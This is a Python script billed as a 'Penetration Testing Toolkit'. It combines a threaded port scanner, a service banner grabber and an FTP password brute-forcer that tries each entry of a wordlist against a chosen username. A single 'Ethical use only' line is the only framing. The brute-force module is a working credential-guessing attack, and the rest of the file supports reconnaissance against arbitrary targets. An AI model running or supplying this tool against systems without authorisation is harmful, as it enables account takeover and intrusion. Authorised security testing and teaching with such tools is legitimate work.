import socket
import threading
import datetime
import sys
import ftplib
try:
    from colorama import init,Fore,Style
    init(autoreset=True)
    COLOURS =True
except ImportError:
    COLOURS = False

def print_green(text):
    if COLOURS:
        print(Fore.GREEN + text + Style.RESET_ALL) 
    else:
        print("[+] " + text)
def print_red(text):
    if COLOURS:
        print(Fore.RED + text + Style.RESET_ALL) 
    else:
        print("[-] " + text)
def print_yellow(text):
    if COLOURS:
        print(Fore.YELLOW + text + Style.RESET_ALL) 
    else:
        print("[*] " + text)
def print_cyan(text):
    if COLOURS:
        print(Fore.CYAN + text + Style.RESET_ALL) 
    else:
        print("[*] " + text)
SERVICE_MAP = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    110: "POP3",
    143: "IMAP",
    443: "HTTPS",
    3306: "MySQL",
    3389: "RDP",
    5432: "PostgreSQL",
    8080: "HTTP-Alt",
    8443: "HTTPS-Alt",
}

# MODULE 1: PORT SCANNER
open_ports = []
def scan_port(target, port, timeout):
    """this function tries to connect one port
    If connection works = port is open 
    Otherwise = port is closed
    """
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target,port))
        sock.close()
        if result == 0:
            service = SERVICE_MAP.get(port, "Unknown")
            open_ports.append((port,service))
            print_green(f"Port {port} is open ({service})")
    except socket.error:
        pass
def run_port_scanner():
    """
    main function for port scanner module
    
    """
    print_cyan("\n" + "=" * 50)
    print_cyan("PORT SCANNER")
    print_cyan("=" * 50)
    target = input("Enter target IP or hostname: ")
    try:
        target_ip = socket.gethostbyname(target)
        print_yellow(f"resolving {target} to {target_ip}...")
    except socket.gaierror:
        print_red("Invalid target. Please enter a valid IP address or hostname.")
        return
    try:
        start_port=int(input("enter start port(eg. 1):"))
        end_port=int(input("enter end port(eg. 1000):"))
        timeout = float(input("enter timeout in seconds (eg. 1.0):"))
    except ValueError:
        print_red("Invalid input. Please enter numeric values for ports and timeout.")
        return
    start_time = datetime.datetime.now()
    print_yellow(f"\n Scanning {target_ip} from port {start_port} to {end_port}...")
    print_yellow(f"started at {start_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    open_ports.clear()
    threads = []
    for port in range(start_port,end_port+1):
        thread = threading.Thread(target=scan_port,args=(target_ip,port,timeout))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    end_time = datetime.datetime.now()
    duration = (end_time - start_time).seconds

    print_cyan("\n" + "=" * 50)
    print_cyan(f"Scan completed in {duration} seconds.")
    print_cyan(f"open ports on {target_ip}: {len(open_ports)}")
    print_cyan("=" * 50)
    save = input("Do you want to save the results to a file? (y/n): ").lower()
    if save == "y":
        filename = f"scan_{target_ip}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename,'w') as f:
            f.write(f"Port scan Report\n")
            f.write(f"target : {target_ip}\n")
            f.write(f"scan duration : {duration} seconds\n")
            f.write(f"open ports : {len(open_ports)}\n")
            f.write(f"{'-'*40}\n")
            for port,service in open_ports:
                service = SERVICE_MAP.get(port,"Unknown")
                f.write(f"Port {port} is open ({service})\n")
        print_green(f"Results saved to {filename}")

#MODULE 2: BANNER GRABBER
def grab_banner():
    """this function tries to connect one port
    If connection works = port is open 
    Otherwise = port is closed
    """
    print_cyan("BANNER GRABBER")
    target = input("Enter target IP or hostname: ")
    try:
        port=int(input("Enter port to grab banner from: "))
    except ValueError:
        print_red("Invalid input. Please enter a numeric value for the port.")
        return
    print_yellow(f"\n Connecting to {target}:{port}...")
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target,port))
        sock.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
        banner = sock.recv(1024)
        banner_text = banner.decode('utf-8', errors='ignore').strip()
        sock.close()
        print_green("\n --- BANNER GRABBED ---")
        print_green(banner_text)
    except socket.timeout:
        print_red("Connection timed out. The port may be closed or filtered.")
    except ConnectionRefusedError:
        print_red("Connection refused. The port is closed.")
    except Exception as e:
        print_red(f"An error occurred: {e}")

#MODULE 3: BRUTE FORCE ATTACKER
def run_brute_force():
    """
    brute force attack module main function
    """
    print_cyan("\n" + "=" * 50)
    print_cyan("BRUTE FORCE ATTACKER")
    print_cyan("=" * 50)
    print_yellow("[!] Ethical use only.")
    target = input("Enter target FTP server IP or hostname: ").strip()
    username = input("Enter username to brute force: ").strip()
    wordlist_path = input("Enter path to password wordlist: ").strip()
    try:
        with open(wordlist_path,'r') as f:
            passwords = f.read().splitlines()
        print_yellow(f"Loaded {len(passwords)} passwords from {wordlist_path}")
    except FileNotFoundError:
        print_red(f"File not found:'{wordlist_path}' not found!")
        print_yellow("Tip : Create a file called 'passwords.txt' and add some common passwords to it, one per line.")
        return
    print_yellow(f"Starting brute force attack on {target} with username '{username}'...")
    found = False
    for i , password in enumerate(passwords,1):
        password = password.strip()
        if not password:
            continue
        try:
            print(f"[{i}/{len(passwords)}] Trying password: '{password}'",end='\r')
            ftp = ftplib.FTP()
            ftp.connect(target,21,timeout=5)
            ftp.login(username,password)
            ftp.quit()
            print_green(f"\n[+] Password found: '{password}'")
            print_green(f"FTP login successful with username '{username}' and password '{password}'")
            found = True
            break
        except ftplib.all_errors:
            pass
        except(ConnectionRefusedError, socket.timeout):
            print_red("\nConnection error. The FTP server may be down or blocking connections.")
            break
    if not found:
        print_red("\n[-] Password not found in the wordlist.")
        print_yellow("Tip: Try using a larger wordlist or adding more common passwords to it.")
        return
    
#MAIN MENU
def print_banner():
    """
    print the tool's welcome banner
    """
    print("\n")
    print("===============================================")
    print("   Penetration Testing Toolkit - Version 1.0   ")
    print("===============================================")
    print(f"started at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()

def show_menu():
    """
    display the main menu and handle user input
    """
    while True:
        print_cyan("\n" + "=" * 50)
        print_cyan("MAIN MENU")
        print_cyan("=" * 50)
        print("1. Port Scanner")
        print("2. Banner Grabber")
        print("3. Brute Force Attacker")
        print("4. Exit")
        choice = input("Enter your choice (1-4): ").strip()
        if choice == "1":
            run_port_scanner()
        elif choice == "2":
            grab_banner()
        elif choice == "3":
            run_brute_force()
        elif choice == "4":
            print_green("Exiting the toolkit. Goodbye!")
            sys.exit(0)
        else:
            print_red("Invalid choice. Please enter a number between 1 and 4.")
if __name__ == "__main__":
    print_banner()
    show_menu()